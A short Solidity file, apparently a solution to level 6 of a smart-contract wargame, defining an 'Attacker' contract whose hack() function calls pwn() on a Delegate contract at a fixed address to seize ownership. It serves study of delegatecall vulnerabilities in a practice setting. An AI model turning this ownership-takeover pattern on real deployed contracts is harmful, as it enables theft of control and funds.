// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level06.sol";

contract Attacker
{
    Delegate level06 = Delegate(0xd27C6dAC8B335ba66d803f9f4D00a410B53D4534);
    address myOwner = msg.sender;

    function hack() public
    {
        level06.pwn();
    }
}